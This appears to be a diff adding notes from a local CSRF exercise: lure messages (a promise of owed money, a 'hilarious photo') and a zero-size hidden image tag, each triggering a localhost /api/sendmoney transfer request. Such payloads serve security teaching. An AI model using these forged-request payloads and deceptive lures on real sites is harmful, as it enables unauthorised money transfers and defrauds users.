@@ -1,0 +1,20 @@
+http://localhost:8080/csrf/csrf-page-post.html
+
+/* PORUKA */
+Hey,
+The rest of the money I owe you is here -> <a href="http://localhost:8080/evil/csrf-page-get.html" target="_blank">Click here</a>
+Enjoy!
+
+/* MAIL */
+1.)
+Hey, 
+check this photo out. It's hilarous!
+<a href="https://localhost:4200/api/sendmoney/receiver=mk@mail.hr&amount=2000&description=gotcha!">Photo</a>
+
+2.)
+fake image:
+
+<img src="https://localhost:4200/api/sendmoney/receiver=mk@mail.hr&amount=2000&description=gotcha!" width="0" height="0" border="0">
+
+
+
